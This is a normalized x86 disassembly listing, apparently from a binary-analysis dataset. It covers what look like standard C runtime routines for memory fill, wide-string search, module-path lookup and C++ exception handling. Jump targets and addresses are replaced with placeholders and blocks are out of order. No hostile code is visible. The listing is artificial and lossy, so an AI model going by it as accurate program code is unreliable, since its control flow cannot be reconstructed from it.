imul eax eax 0x1010101
cmp ecx 0x20
jle r-xdata
test ecx 0x3
je r-xdata
cmp ecx 0x80
jl r-xdata
test ecx 0x4
je r-xdata
mov [ edi ] al
inc edi
sub ecx 0x1
test ecx 0x3
jne r-xdata
bt [ rw-data ] 0x1
jae r-xdata
bt [ rw-data ] 0x1
jae r-xdata
test ecx 0xfffffff8
je r-xdata
mov [ edi ] eax
add edi 0x4
sub ecx 0x4
movd xmm0 eax
pshufd xmm0 xmm0 0x0
bt [ rw-data ] 0x1
jae r-xdata
[ edi ]
mov eax [ esp + 0x4 ]
mov edi edx
retn
lea esp [ esp ]
lea ebx [ ebx ]
lea edi [ ecx + edi - 0x20 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm0
mov eax [ esp + 0x4 ]
mov edi edx
retn
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm0
add edi 0x20
sub ecx 0x20
cmp ecx 0x20
jae r-xdata
movd xmm0 eax
pshufd xmm0 xmm0 0x0
add ecx edi
movups [ edi ] xmm0
add edi 0x10
and edi 0xfffffff0
sub ecx edi
cmp ecx 0x80
jle r-xdata
mov [ edi ] eax
mov [ edi + 0x4 ] eax
add edi 0x8
sub ecx 0x8
test ecx 0xfffffff8
jne r-xdata
test ecx 0x1f
je r-xdata
lea esp [ esp ]
lea esp [ esp ]
nop
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
sub ecx 0x80
test ecx 0xffffff00
jne r-xdata
jmp r-xdata
cmp ecx 0x20
jb r-xdata
sub_40bfcd
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x28
push esi
push edi
mov edi [ ebx + 0xc ]
xor eax eax
movzx ecx [ edi ]
mov [ ebp - 0x8 ] ecx
cmp ax cx
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
jne r-xdata
mov eax edi
and eax 0xfff
push 0x2
pop esi
cmp eax 0xff0
ja r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
mov edx [ ebx + 0x8 ]
movzx eax [ edx ]
test ax ax
je r-xdata
movzx eax cx
pxor xmm3 xmm3
mov ecx [ ebx + 0x8 ]
push 0x2
pop esi
movd xmm0 eax
pshuflw xmm0 xmm0 0x0
pshufd xmm4 xmm0 0x0
push 0x8
pxor xmm0 xmm0
movzx ecx cx
pop edx
movups xmm0 [ edi ]
jmp r-xdata
xor eax eax
and [ ebp - 0x8 ] 0x0
mov ecx eax
mov eax edx
sub eax edi
mov [ ebp - 0x4 ] eax
push 0x2
pop esi
test cx cx
je r-xdata
movzx eax [ ecx ]
xor edx edx
cmp dx ax
je r-xdata
movups xmm1 [ ecx ]
movaps xmm0 xmm3
pcmpeqw xmm0 xmm1
pcmpeqw xmm1 xmm4
por xmm0 xmm1
pmovmskb eax xmm0
test eax eax
jne r-xdata
sub edx 0x1
jne r-xdata
add edi esi
movzx ecx [ edi ]
mov edx [ ebx + 0x8 ]
mov ecx [ ebp - 0x8 ]
movzx ecx [ edi ]
test cx cx
je r-xdata
movzx edx [ edi ]
cmp dx ax
jne r-xdata
bsf eax eax
mov [ ebp - 0x8 ] eax
shr eax 0x1
lea ecx [ ecx + eax * 2 ]
add ecx 0x10
jmp r-xdata
movzx eax cx
psrldq xmm0 0x2
pinsrw xmm0 eax 0x7
xor eax eax
cmp ax cx
je r-xdata
mov ecx [ ebp - 0x8 ]
movzx eax [ edx ]
xor edi edi
cmp di ax
je r-xdata
pcmpistri xmm0 [ edx ] 0xd
jbe r-xdata
mov eax edx
jmp r-xdata
mov edi [ ebx + 0xc ]
add edx esi
add eax esi
mov [ ebp - 0x4 ] eax
movzx ecx [ edx ]
test cx cx
jne r-xdata
movzx ecx [ eax + edi ]
movzx eax [ edi ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
jne r-xdata
add ecx esi
jmp r-xdata
mov edx ecx
mov eax ecx
and eax 0xfff
cmp eax 0xff0
ja r-xdata
cmp ax cx
je r-xdata
jae r-xdata
add edx 0x10
cmp [ edi ] cx
je r-xdata
add edi esi
cmp [ eax + edi ] cx
jne r-xdata
movzx eax [ edi ]
and [ ebp - 0x8 ] 0x0
cmp [ ebp - 0x8 ] ax
je r-xdata
mov eax edx
and eax 0xfff
cmp eax 0xff0
ja r-xdata
mov ecx [ ebx + 0xc ]
mov edi edx
add edx esi
jmp r-xdata
pcmpistri xmm0 [ edx ] 0xd
lea edx [ edx + ecx * 2 ]
mov eax edx
and eax 0xfff
cmp eax 0xff0
ja r-xdata
jmp r-xdata
mov eax ecx
jmp r-xdata
cmp [ edx ] ax
jne r-xdata
movups xmm2 [ edi ]
movups xmm1 [ edx ]
movaps xmm0 xmm3
pcmpeqw xmm1 xmm2
pcmpeqw xmm0 xmm2
pcmpeqw xmm1 xmm3
por xmm1 xmm0
pmovmskb eax xmm1
test eax eax
jne r-xdata
movzx eax [ ecx ]
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x4 ] ax
je r-xdata
mov eax ecx
and eax 0xfff
cmp eax 0xff0
ja r-xdata
mov edi [ ebx + 0xc ]
add edx esi
add edi esi
jmp r-xdata
bsf eax eax
mov [ ebp - 0x8 ] eax
and eax 0xfffffffe
add edx eax
add edi eax
add edx 0x10
add edi 0x10
jmp r-xdata
cmp [ edi ] ax
jne r-xdata
movups xmm1 [ ecx ]
pcmpistri xmm1 [ edi ] 0xd
jno r-xdata
mov eax edi
and eax 0xfff
cmp eax 0xff0
ja r-xdata
add edx esi
jmp r-xdata
add edi esi
add ecx esi
jmp r-xdata
js r-xdata
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov eax edi
mov [ ebp - 0x4 ] ecx
and eax 0xfff
cmp eax 0xff0
ja r-xdata
mov ecx [ ebp - 0x4 ]
add edi 0x10
add ecx 0x10
jmp r-xdata
sub_40c251
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
push esi
push edi
push [ ebp + 0x8 ]
call [ GetModuleFileNameW@IAT ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
retn
test eax eax
jne r-xdata
cmp eax esi
jne r-xdata
xor ecx ecx
mov [ edi ] cx
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ edi + esi * 2 - 0x2 ] ax
sub_40c28b
push ebp
mov ebp esp
sub esp 0x24c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20c ]
push 0x104
push ecx
push eax
call sub_40c251
add esp 0xc
cmp [ rw-data ] 0x5
jbe r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn
push edi
push 0x2000
push 0x0
mov edi rw-data
push edi
call sub_40119b
add esp 0xc
test al al
je r-xdata
pop edi
lea eax [ ebp - 0x22c ]
push r--data
push eax
call sub_4010a7
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x21c ]
push eax
call sub_4010df
lea eax [ ebp - 0x24c ]
push eax
push 0x4
push 0x0
push 0x0
push r--data
push edi
call sub_4011d7
add esp 0x28
sub_40c327
push ebp
mov ebp esp
sub esp 0x24c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20c ]
push 0x104
push ecx
push eax
call sub_40c251
add esp 0xc
cmp [ rw-data ] 0x5
jbe r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn
push edi
push 0x2000
push 0x0
mov edi rw-data
push edi
call sub_40119b
add esp 0xc
test al al
je r-xdata
pop edi
lea eax [ ebp - 0x22c ]
push r--data
push eax
call sub_4010a7
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x21c ]
push eax
call sub_4010df
lea eax [ ebp - 0x24c ]
push eax
push 0x4
push 0x0
push 0x0
push r--data
push edi
call sub_4011d7
add esp 0x28
sub_40c3f0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0xc ]
add ecx edi
xor ecx [ eax + edi ]
pop edi
pop esi
pop ebp
jmp sub_40a8ab
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40a8ab
sub_40c430
push ebp
mov ebp esp
sub esp 0x1c
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov eax [ ebx + 0x8 ]
lea esi [ ebx + 0x10 ]
xor eax [ rw-data ]
push esi
push eax
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x8 ] eax
call sub_40c3f0
mov edi [ ebp + 0x10 ]
push edi
call sub_40c250
mov eax [ ebp + 0x8 ]
add esp 0xc
test [ eax + 0x4 ] 0x66
jne r-xdata
cmp [ ebx + 0xc ] 0xfffffffe
je r-xdata
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x1c ]
mov [ ebp - 0x18 ] edi
mov edi [ ebx + 0xc ]
mov [ ebx - 0x4 ] eax
cmp edi 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push esi
mov ecx ebx
mov edx 0xfffffffe
call sub_40dac7
mov ecx [ ebp - 0x8 ]
lea eax [ edi + 0x2 ]
lea eax [ edi + eax * 2 ]
mov ebx [ ecx + eax * 4 ]
lea eax [ ecx + eax * 4 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x14 ] eax
test ecx ecx
je r-xdata
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_40da7e
mov cl 0x1
mov [ ebp - 0x1 ] cl
test eax eax
js r-xdata
test cl cl
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jle r-xdata
jmp r-xdata
push esi
push [ ebp - 0x8 ]
call sub_40c3f0
add esp 0x8
mov edi ebx
cmp ebx 0xfffffffe
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_40daae
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] edi
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
push esi
push [ ebp - 0x8 ]
mov [ eax + 0xc ] ebx
call sub_40c3f0
mov ecx [ ebp - 0x14 ]
add esp 0x8
mov edx esi
mov ecx [ ecx + 0x8 ]
call sub_40da95
int3
jmp r-xdata
push r--data
call sub_41d020
add esp 0x4
test eax eax
je r-xdata
push rw-data
push esi
mov edx edi
mov ecx eax
call sub_40dac7
mov eax [ ebp + 0xc ]
mov esi [ r--data ]
mov ecx esi
push 0x1
push [ ebp + 0x8 ]
call j_sub_40c250
call esi
mov esi [ ebp - 0x10 ]
add esp 0x8
sub_40c58a
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ edi ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] 0x0
mov ecx [ edi ]
test ecx ecx
je r-xdata
lea edx [ ecx + 0x1 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ebx
push esi
lea ebx [ ecx + 0x1 ]
push ebx
call sub_410eea
mov esi eax
pop ecx
test esi esi
je r-xdata
push esi
call j_sub_411e2d#2
pop ecx
pop esi
pop ebx
jmp r-xdata
push [ edi ]
push ebx
push esi
call sub_411dd3
mov eax [ ebp + 0xc ]
mov ecx esi
add esp 0xc
xor esi esi
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop edi
pop ebp
retn
sub_40c5ed
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] 0x0
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
pop esi
pop ebp
retn
push [ esi ]
call j_sub_411e2d#2
pop ecx
sub_40c60c
push ebp
mov ebp esp
sub esp 0x20
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] edi
test edi edi
je r-xdata
test [ edi ] 0x10
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test [ edi ] 0x8
je r-xdata
mov ecx [ ebx ]
sub ecx 0x4
push ecx
mov eax [ ecx ]
mov esi [ eax + 0x20 ]
mov ecx esi
mov edi [ eax + 0x18 ]
call j_sub_40c250
call esi
mov [ ebp - 0xc ] 0x1994000
sub_40c67a
call sub_40db49
call sub_40d924
call sub_40dade
test al al
jne r-xdata
call sub_40c7aa
test al al
jne r-xdata
xor al al
retn
call sub_40c3c3
mov al 0x1
retn
call sub_40db1a
jmp r-xdata
sub_40c6a8
push ebp
mov ebp esp
call sub_40c3d6
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov al 0x1
pop ebp
retn
call sub_40c7dd
call sub_40db1a
push 0x0
call sub_40d948
pop ecx
sub_40c6cc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
cmp eax ecx
jne r-xdata
add ecx 0x5
add eax 0x5
xor eax eax
pop ebp
retn
sbb eax eax
or eax 0x1
pop ebp
retn
test dl dl
je r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
jmp r-xdata
sub_40c732
cmp [ rw-data ] 0xffffffff
jne r-xdata
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_40d867
mov esi eax
pop ecx
test esi esi
je r-xdata
xor eax eax
retn
push 0x28
push 0x1
call sub_411ef8
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push edi
call [ SetLastError@IAT ]
mov eax esi
jmp r-xdata
push edi
call [ SetLastError@IAT ]
xor edi edi
jmp r-xdata
push esi
push [ rw-data ]
call sub_40d8a1
pop ecx
pop ecx
test eax eax
jne r-xdata
pop edi
pop esi
retn
push esi
call sub_411e2d
pop ecx
mov eax edi
push edi
call [ SetLastError@IAT ]
mov edi esi
xor esi esi
sub_40c7aa
push sub_40c708
call sub_40d7f3
mov [ rw-data ] eax
pop ecx
cmp eax 0xffffffff
jne r-xdata
push rw-data
push eax
call sub_40d8a1
pop ecx
pop ecx
test eax eax
jne r-xdata
xor al al
retn
mov al 0x1
retn
call sub_40c7dd
jmp r-xdata
sub_40c800
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_40dc7c
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_40dc7c
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_40c84c
push 0x8
push r--data
call sub_40b2f0
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
call sub_40b336
retn
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
mov ecx [ eax + 0x1c ]
test ecx ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
mov edx [ ecx + 0x4 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
test [ ecx ] 0x10
je r-xdata
and [ ebp - 0x4 ] 0x0
push edx
push [ eax + 0x18 ]
call sub_40d128
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
mov eax [ eax + 0x18 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ecx
mov esi [ eax + 0x8 ]
mov ecx esi
call j_sub_40c250
call esi
sub_40c8e0
push ebp
mov ebp esp
push ecx
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ ebp - 0x4 ] esi
call sub_40ab94
mov [ esi ] r--data
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40c919
push 0x38
push r--data
call sub_40b2f0
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
and [ ebp - 0x3c ] 0x0
mov ebx [ ebp + 0xc ]
mov eax [ ebx - 0x4 ]
mov [ ebp - 0x2c ] eax
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_40b788
pop ecx
pop ecx
mov [ ebp - 0x30 ] eax
call sub_40c724
mov eax [ eax + 0x10 ]
mov [ ebp - 0x34 ] eax
call sub_40c724
mov eax [ eax + 0x14 ]
mov [ ebp - 0x38 ] eax
call sub_40c724
mov [ eax + 0x10 ] edi
call sub_40c724
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x14 ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push ebx
call sub_40b51b
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x40 ] 0x0
call sub_40ca54
mov eax ebx
call sub_40b336
retn
sub_40c9ad
mov esp [ ebp - 0x18 ]
call sub_40c724
and [ eax + 0x20 ] 0x0
mov edx [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
cmp [ edx + 0x4 ] 0x80
jg r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ ebx + 0x8 ]
jmp r-xdata
push eax
push edx
push 0x0
push ebx
call sub_40d35d
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x40 ] 0x0
call sub_40ca54
mov eax ebx
call sub_40b336
retn
imul ebx ecx 0x14
mov [ ebp - 0x24 ] ebx
cmp eax [ ebx + edi + 0x4 ]
mov ebx [ ebp + 0xc ]
jle r-xdata
mov [ ebp - 0x20 ] eax
mov edi [ edx + 0x10 ]
xor ecx ecx
mov [ ebp - 0x28 ] ecx
cmp [ edx + 0xc ] ecx
jbe r-xdata
inc ecx
mov [ ebp - 0x28 ] ecx
cmp ecx [ edx + 0xc ]
jb r-xdata
mov ebx [ ebp - 0x24 ]
cmp eax [ ebx + edi + 0x8 ]
mov ebx [ ebp + 0xc ]
jg r-xdata
imul eax ecx 0x14
mov eax [ eax + edi + 0x4 ]
inc eax
mov [ ebp - 0x20 ] eax
mov ecx [ edx + 0x8 ]
mov eax [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] eax
jmp r-xdata
sub_40ca54
mov eax [ ebp - 0x2c ]
mov [ ebx - 0x4 ] eax
push [ ebp - 0x30 ]
call sub_40b7ac
pop ecx
call sub_40c724
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x10 ] ecx
call sub_40c724
mov ecx [ ebp - 0x38 ]
mov [ eax + 0x14 ] ecx
cmp [ edi ] 0xe06d7363
jne r-xdata
mov ebx [ ebp - 0x1c ]
cmp [ edi + 0x10 ] 0x3
jne r-xdata
cmp [ edi + 0x14 ] 0x19930520
je r-xdata
mov ebx [ ebp - 0x1c ]
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
cmp [ edi + 0x14 ] 0x19930521
je r-xdata
retn
test ebx ebx
je r-xdata
cmp [ edi + 0x14 ] 0x19930522
jne r-xdata
push [ edi + 0x18 ]
call sub_40b7f4
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x40 ] 0x0
setne al
movzx eax al
push eax
push edi
call sub_40c84c
pop ecx
pop ecx
jmp r-xdata
sub_40cb0f
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push edi
mov edi [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0x2c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push edi
push [ ebp + 0x8 ]
call sub_40d154
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp r-xdata
pop edi
pop ebp
retn
push edi
push eax
call sub_40b6d0
call sub_40b702
push esi
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_40d35d
mov eax [ esi + 0x4 ]
inc eax
push 0x100
push [ ebp + 0x28 ]
mov [ edi + 0x8 ] eax
mov eax [ ebp + 0x1c ]
push [ eax + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_40c919
add esp 0x2c
pop esi
test eax eax
je r-xdata
sub_40cb8a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
call sub_40c724
xor ecx ecx
inc ecx
mov [ eax + 0x20 ] ecx
mov eax ecx
pop ebp
retn
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
sub_40cbd4
push ebp
mov ebp esp
sub esp 0x44
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x18 ]
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x1 ] 0x0
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ ebx + 0x8 ]
jmp r-xdata
call sub_411d97
cmp eax [ edi + 0x4 ]
jge r-xdata
mov [ ebp - 0x8 ] eax
cmp eax 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0xe06d7363
jne r-xdata
mov ecx [ ebp + 0x10 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
call sub_40c724
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push eax
push edi
push [ ebp + 0x14 ]
push ecx
push ebx
push esi
call sub_40cf32
add esp 0x20
cmp [ esi ] 0xe06d7363
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
call sub_40c724
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
call sub_40c724
mov esi [ eax + 0x10 ]
call sub_40c724
mov [ ebp - 0x28 ] 0x1
mov eax [ eax + 0x14 ]
mov [ ebp - 0xc ] eax
test esi esi
je r-xdata
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ esi ] 0xe06d7363
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ ebp - 0x18 ]
push ecx
push eax
push [ ebp + 0x20 ]
push edi
call sub_40b658
mov edx [ ebp - 0x18 ]
add esp 0x14
cmp edx [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
call sub_40c724
cmp [ eax + 0x1c ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_40c84c
pop ecx
pop ecx
lea ecx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_40c724
mov eax [ eax + 0x1c ]
mov [ ebp - 0x20 ] eax
call sub_40c724
push [ ebp - 0x20 ]
push esi
and [ eax + 0x1c ] 0x0
call sub_40d04d
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc edx
add ecx 0x14
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x20 ] ecx
cmp edx [ ebp - 0x2c ]
jb r-xdata
cmp eax [ ecx - 0xc ]
jg r-xdata
push [ ebp - 0x20 ]
call sub_40d0e9
pop ecx
test al al
je r-xdata
cmp [ esi + 0x1c ] 0x0
je r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ edi + 0x1c ] 0x0
jne r-xdata
lea edi [ ecx - 0x10 ]
mov [ ebp - 0x38 ] edi
mov edi [ ebp + 0x18 ]
cmp [ ecx - 0x10 ] eax
jg r-xdata
mov ebx [ ecx ]
mov [ ebp - 0x14 ] ebx
mov ebx [ ecx - 0x4 ]
test ebx ebx
mov [ ebp - 0x1c ] ebx
mov ebx [ ebp + 0xc ]
jle r-xdata
jmp r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
test [ edi + 0x20 ] 0x4
jne r-xdata
test [ edi + 0x20 ] 0x4
je r-xdata
mov eax [ esi + 0x1c ]
mov ecx [ ebp - 0x14 ]
mov eax [ eax + 0xc ]
mov edx [ eax ]
add eax 0x4
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x34 ] edx
push 0x1
push esi
call sub_40c84c
pop ecx
pop ecx
lea ecx [ ebp - 0x44 ]
call sub_40c901
push r--data
lea eax [ ebp - 0x44 ]
push eax
call sub_40c60c
push [ edi + 0x1c ]
push esi
call sub_40d04d
pop ecx
pop ecx
test al al
jne r-xdata
dec eax
add ecx 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x14 ] ecx
test eax eax
jle r-xdata
mov eax [ ebp - 0x10 ]
push [ esi + 0x1c ]
push [ eax ]
push ecx
call sub_40d521
add esp 0xc
test eax eax
jne r-xdata
call sub_40c724
call sub_40c724
call sub_40c724
mov [ eax + 0x10 ] esi
call sub_40c724
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp - 0xc ]
push esi
mov [ eax + 0x14 ] ecx
jne r-xdata
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x34 ]
jmp r-xdata
push [ ebp - 0x28 ]
mov eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x20 ]
push [ ebp - 0x38 ]
push [ eax ]
push [ ebp - 0x14 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push ebx
push esi
call sub_40cb0f
add esp 0x2c
mov eax [ ebp - 0x24 ]
add [ ebp - 0x10 ] 0x4
dec eax
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x24 ] eax
test eax eax
jg r-xdata
push [ ebp + 0x24 ]
push ebx
jmp r-xdata
mov edi [ ebp - 0x30 ]
mov [ ebp - 0x10 ] edi
mov edi [ ebp + 0x18 ]
mov [ ebp - 0x24 ] edx
test edx edx
jle r-xdata
mov eax [ ebp - 0x1c ]
call sub_40b702
push 0xffffffff
push edi
push [ ebp + 0x14 ]
push ebx
call sub_40d35d
add esp 0x10
push [ edi + 0x1c ]
call sub_40cad5
sub_40cf32
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi ] 0x80000003
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
push ebx
push esi
call sub_40c724
mov ebx [ ebp + 0x18 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
push 0x0
call [ EncodePointer@IAT ]
mov esi eax
call sub_40c724
cmp [ eax + 0x8 ] esi
je r-xdata
call sub_411d97
lea eax [ ebp - 0x4 ]
push eax
